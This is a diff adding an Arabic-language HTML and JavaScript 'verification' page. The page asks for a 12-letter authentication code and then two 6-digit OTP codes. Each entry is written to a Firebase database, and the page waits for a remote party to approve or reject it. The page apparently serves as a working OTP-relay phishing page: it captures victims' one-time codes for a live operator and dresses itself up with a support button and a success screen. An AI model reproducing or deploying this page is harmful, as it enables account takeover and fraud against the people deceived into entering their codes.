@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>التحقق</title>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+:root{--bg:#1c1f2e;--field:#2f3243;--accent:#617ecc;--text:#fff;--muted:#9b9ca0;--placeholder:#c4c5cc;--danger:#e5484d;--ok:#3ea66b;--radius:14px;--font:'Tajawal',sans-serif}
+*{box-sizing:border-box;margin:0;padding:0;font-family:var(--font)}
+body{background:var(--bg);color:var(--text);min-height:100vh}
+.screen{position:fixed;inset:0;background:radial-gradient(circle at 50% 20%,rgba(97,126,204,.14),transparent 45%),var(--bg);display:none;flex-direction:column;padding:14px 22px 26px;overflow-y:auto}
+.screen.show{display:flex}
+/* ==== زر خدمة العملاء (نفس الموجود في index) ==== */
+.support-btn{position:absolute;top:14px;left:20px;width:31px;height:31px;background:transparent;border:none;color:#fff;font-size:21px;cursor:pointer;display:flex;align-items:center;justify-content:center;-webkit-tap-highlight-color:transparent;z-index:6}
+.support-btn:active{opacity:.7}
+.support-badge{position:absolute;top:-2px;right:-3px;width:10px;height:10px;border-radius:50%;background:var(--danger);border:2px solid var(--bg);display:none}
+.otp-logo{width:170px;max-width:55%;height:auto;display:block;margin:6vh auto 7vh}
+.otp-title{font-size:24px;font-weight:700;text-align:right}
+.otp-subtitle{font-size:15px;color:var(--placeholder);text-align:right;margin-top:6px;margin-bottom:30px;line-height:1.7}
+.otp-boxes{display:flex;gap:10px;width:100%;direction:ltr;margin-bottom:30px}
+.otp-box{flex:1;min-width:0;height:64px;background:var(--field);border:none;border-radius:14px;color:#fff;font-size:22px;text-align:center;outline:none}
+.otp-box:focus,.code-field:focus{outline:2px solid var(--accent)}
+.code-field{width:100%;height:64px;background:var(--field);border:none;border-radius:14px;color:#fff;font-size:18px;text-align:center;direction:ltr;letter-spacing:1px;outline:none;margin-bottom:30px}
+.code-field::placeholder{color:var(--muted);letter-spacing:0;font-size:16px;direction:rtl;text-align:center}
+.invalid{outline:2px solid var(--danger)!important}
+input:disabled{opacity:.6}
+.otp-confirm{margin-top:auto;align-self:flex-end;min-width:70px;height:44px;background:none;border:none;color:var(--accent);font-size:18px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;padding:6px 10px}
+.otp-confirm:disabled{opacity:.6;cursor:not-allowed}
+.otp-confirm.loading:disabled{opacity:1}
+.btn-spinner{display:none;position:relative;width:24px;height:24px;flex-shrink:0}
+.btn-spinner .ring-outer,.btn-spinner .ring-inner{position:absolute;border-radius:50%;border-style:solid;border-color:transparent}
+.btn-spinner .ring-outer{inset:0;border-width:2.5px;border-top-color:currentColor;border-right-color:currentColor;animation:cw .9s linear infinite}
+.btn-spinner .ring-inner{inset:6px;border-width:2.5px;border-bottom-color:currentColor;border-left-color:currentColor;opacity:.6;animation:ccw .65s linear infinite}
+@keyframes cw{to{transform:rotate(360deg)}}@keyframes ccw{to{transform:rotate(-360deg)}}
+.otp-confirm.loading .btn-label{display:none}.otp-confirm.loading .btn-spinner{display:inline-block}
+.otp-error-banner{display:none;align-items:center;gap:12px;background:var(--danger);border-radius:16px;padding:14px 16px;margin-top:14px}
+.otp-error-banner.show{display:flex}
+.otp-error-text{flex:1;color:#fff;font-size:15px;font-weight:600;text-align:right;line-height:1.6}
+.otp-error-circle{order:-1;width:30px;height:30px;border-radius:50%;border:1.5px solid rgba(255,255,255,.85);color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0;cursor:pointer}
+.done{margin:auto;text-align:center}
+.done i{font-size:64px;color:var(--ok);margin-bottom:18px}
+.done div{font-size:20px;font-weight:700}
+.conn{display:none;position:fixed;top:0;left:0;right:0;background:var(--danger);color:#fff;text-align:center;padding:8px;font-size:13px;z-index:99}
+</style>
+</head>
+<body>
+<div class="conn" id="conn">تعذّر الاتصال بقاعدة البيانات، تأكد من الإنترنت</div>
+<div id="root"></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, get, set, push, update, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+
+/* ===== الإعدادات: عدّل عدد الخانات أو النصوص هنا ===== */
+const LOGO = 'https://i.imgur.com/WnTTBP5.png';
+const STEPS = [
+  { sub: 'أدخل رمز التوثيق المكوّن من 12 حرفاً الذي وصلتك في الرسالة', len: 12, mode: 'field', placeholder: 'رمز التوثيق', err: 'رمز التوثيق غير صالح.' },
+  { title: 'رمز التأكيد', sub: 'قم بإدخال رمز التحقق المُرسل إليك', len: 6, mode: 'boxes', err: 'رمز OTP غير صالح.' },
+  { title: 'رمز التأكيد', sub: 'قم بإدخال رمز التحقق المُرسل إليك', len: 6, mode: 'boxes', err: 'رمز OTP غير صالح.' }
+];
+/* ================================================== */
+
+const cfg = {
+  apiKey: "AIzaSyDyMyqxp0OEe7DM5a17O4QQCrpu5dazQJc",
+  authDomain: "tawteek-9206c.firebaseapp.com",
+  databaseURL: "https://tawteek-9206c-default-rtdb.firebaseio.com",
+  projectId: "tawteek-9206c",
+  storageBucket: "tawteek-9206c.firebasestorage.app",
+  messagingSenderId: "631433779854",
+  appId: "1:631433779854:web:319e2d278cddb8d0ab07df"
+};
+const app = initializeApp(cfg);
+const db = getDatabase(app, cfg.databaseURL);
+
+/* ننتظر المصادقة قبل أي قراءة/كتابة لتفادي فشل الصلاحيات */
+const authReady = signInAnonymously(getAuth(app)).catch(e => console.warn('auth', e));
+
+let discTimer = null;
+onValue(ref(db, '.info/connected'), s => {
+  const bar = document.getElementById('conn');
+  if (s.val() === true) { clearTimeout(discTimer); discTimer = null; bar.style.display = 'none'; }
+  else if (!discTimer) discTimer = setTimeout(() => { discTimer = null; bar.style.display = 'block'; }, 12000);
+});
+
+const norm = s => String(s || '').replace(/[\u0660-\u0669]/g, d => d.charCodeAt(0) - 0x0660).replace(/[\u06F0-\u06F9]/g, d => d.charCodeAt(0) - 0x06F0);
+const root = document.getElementById('root');
+const els = []; // عناصر كل شاشة
+let rec = null, checkId = localStorage.getItem('check_id') || '', shown = {};
+
+/* زر خدمة العملاء (نفس الموجود في index) */
+const SUP_BTN = `<button class="support-btn" type="button" aria-label="خدمة العملاء"><i class="fa-solid fa-headset"></i><span class="support-badge"></span></button>`;
+
+/* ---------- بناء الشاشات ---------- */
+STEPS.forEach((st, i) => {
+  const sc = document.createElement('div');
+  sc.className = 'screen';
+  sc.innerHTML = `${SUP_BTN}
+    <img class="otp-logo" src="${LOGO}" alt="Logo">
+    ${st.title ? `<div class="otp-title">${st.title}</div>` : ''}
+    <div class="otp-subtitle">${st.sub}</div>
+    <div class="area"></div>
+    <button class="otp-confirm" type="button"><span class="btn-label">تأكيد</span><span class="btn-spinner"><span class="ring-outer"></span><span class="ring-inner"></span></span></button>
+    <div class="otp-error-banner"><div class="otp-error-text">${st.err}</div><div class="otp-error-circle"><i class="fa-solid fa-xmark"></i></div></div>`;
+  const area = sc.querySelector('.area');
+  let inputs = [];
+  if (st.mode === 'field') {
+    const inp = document.createElement('input');
+    inp.className = 'code-field';
+    inp.placeholder = st.placeholder || '';
+    inp.autocomplete = 'off'; inp.autocapitalize = 'characters'; inp.spellcheck = false;
+    /* إدخال الحروف فقط + تحويل تلقائي إلى Capital + شرطة كل 4 حروف */
+    const fmt = v => {
+      const letters = String(v || '').toUpperCase().replace(/[^A-Z]/g, '').slice(0, st.len);
+      return letters.replace(/(.{4})(?=.)/g, '$1-');
+    };
+    inp.addEventListener('input', () => {
+      const raw = inp.value;
+      const sel = inp.selectionStart || 0;
+      const lettersBefore = (raw.slice(0, sel).match(/[A-Za-z]/g) || []).length;
+      const formatted = fmt(raw);
+      inp.value = formatted;
+      let pos = 0, cnt = 0;
+      while (pos < formatted.length && cnt < lettersBefore) {
+        if (/[A-Z]/.test(formatted[pos])) cnt++;
+        pos++;
+      }
+      try { inp.setSelectionRange(pos, pos); } catch (e) {}
+      inp.classList.remove('invalid'); hide();
+    });
+    inp.addEventListener('keydown', e => { if (e.key === 'Enter') btn.click(); });
+    area.appendChild(inp); inputs = [inp];
+  } else {
+    const wrap = document.createElement('div'); wrap.className = 'otp-boxes';
+    for (let k = 0; k < st.len; k++) {
+      const b = document.createElement('input');
+      b.className = 'otp-box';
+      b.type = 'tel';              /* يجبر لوحة الأرقام على معظم الأجهزة */
+      b.inputMode = 'numeric';     /* لوحة أرقام على Android / حديث */
+      b.pattern = '[0-9]*';        /* لوحة أرقام على iPhone/Safari */
+      b.maxLength = 1;
+      if (k === 0) b.autocomplete = 'one-time-code';
+      wrap.appendChild(b); inputs.push(b);
+    }
+    const fill = (digits, start) => { let k = start; for (const ch of digits) { if (k >= inputs.length) break; inputs[k++].value = ch; } inputs[Math.min(k, inputs.length - 1)].focus(); };
+    inputs.forEach((b, k) => {
+      b.addEventListener('input', () => {
+        hide();
+        const d = norm(b.value).replace(/\D/g, '');
+        if (d.length > 1) { b.value = ''; fill(d, k); return; }
+        b.value = d; if (d && inputs[k + 1]) inputs[k + 1].focus();
+      });
+      b.addEventListener('keydown', e => { if (e.key === 'Backspace' && !b.value && inputs[k - 1]) inputs[k - 1].focus(); if (e.key === 'Enter') btn.click(); });
+      b.addEventListener('paste', e => { e.preventDefault(); fill(norm((e.clipboardData || window.clipboardData).getData('text')).replace(/\D/g, ''), k); });
+    });
+    area.appendChild(wrap);
+  }
+  const btn = sc.querySelector('.otp-confirm'), banner = sc.querySelector('.otp-error-banner');
+  const hide = () => banner.classList.remove('show');
+  sc.querySelector('.otp-error-circle').onclick = hide;
+  btn.onclick = async () => {
+    if (btn.classList.contains('loading')) return;
+    const value = inputs.map(x => x.value).join('');
+    const cleaned = st.mode === 'field'
+      ? value.replace(/[^A-Za-z]/g, '')
+      : value.replace(/\D/g, '');
+    if (cleaned.length !== st.len) { inputs.forEach(x => x.classList.add('invalid')); setTimeout(() => inputs.forEach(x => x.classList.remove('invalid')), 900); return; }
+    hide(); busy(true);
+    try {
+      await ensureRecord();
+      await update(ref(db, 'checks/' + checkId), {
+        ['steps/s' + (i + 1) + '/value']: value,
+        ['steps/s' + (i + 1) + '/status']: 'pending',
+        ['steps/s' + (i + 1) + '/submittedAt']: Date.now(),
+        updatedAt: Date.now()
+      });
+    } catch (e) { console.error(e); busy(false); alert('تعذّر الإرسال، حاول مرة أخرى'); }
+  };
+  const busy = on => { btn.classList.toggle('loading', on); btn.disabled = on; inputs.forEach(x => x.disabled = on); };
+  root.appendChild(sc);
+  els.push({ sc, inputs, btn, banner, busy, focus: () => inputs[0].focus(), clear: () => inputs.forEach(x => x.value = '') });
+});
+
+const doneSc = document.createElement('div');
+doneSc.className = 'screen';
+doneSc.innerHTML = `${SUP_BTN}<div class="done"><i class="fa-solid fa-circle-check"></i><div>تم التحقق بنجاح</div></div>`;
+root.appendChild(doneSc);
+
+/* ---------- السجل ---------- */
+async function ensureRecord() {
+  if (checkId) return;
+  await authReady;
+  const r = push(ref(db, 'checks'));
+  await set(r, { createdAt: Date.now(), updatedAt: Date.now(), steps: {} });
+  checkId = r.key;
+  localStorage.setItem('check_id', checkId);
+  listen();
+}
+
+let unsub = null;
+function listen() {
+  if (unsub) unsub();
+  unsub = onValue(ref(db, 'checks/' + checkId), s => { rec = s.val() || { steps: {} }; render(); });
+}
+
+function show(sc) { document.querySelectorAll('.screen').forEach(x => x.classList.toggle('show', x === sc)); }
+
+function render() {
+  const steps = (rec && rec.steps) || {};
+  let cur = STEPS.findIndex((_, i) => (steps['s' + (i + 1)] || {}).status !== 'approved');
+  if (cur === -1) { show(doneSc); return; }
+  const E = els[cur], s = steps['s' + (cur + 1)] || {};
+  const wasHidden = !E.sc.classList.contains('show');
+  show(E.sc);
+  if (s.status === 'pending') { E.busy(true); return; }
+  E.busy(false);
+  if (s.status === 'rejected') {
+    const key = cur + ':' + s.submittedAt;
+    if (shown[key] !== 1) { shown[key] = 1; E.clear(); E.banner.classList.add('show'); E.focus(); }
+    else E.banner.classList.add('show');
+  } else if (wasHidden) E.focus();
+}
+
+/* ---------- تشغيل ---------- */
+function start() {
+  if (checkId) {
+    listen();
+  } else {
+    ensureRecord();
+  }
+}
+
+start();
+</script>
+</body>
+</html>
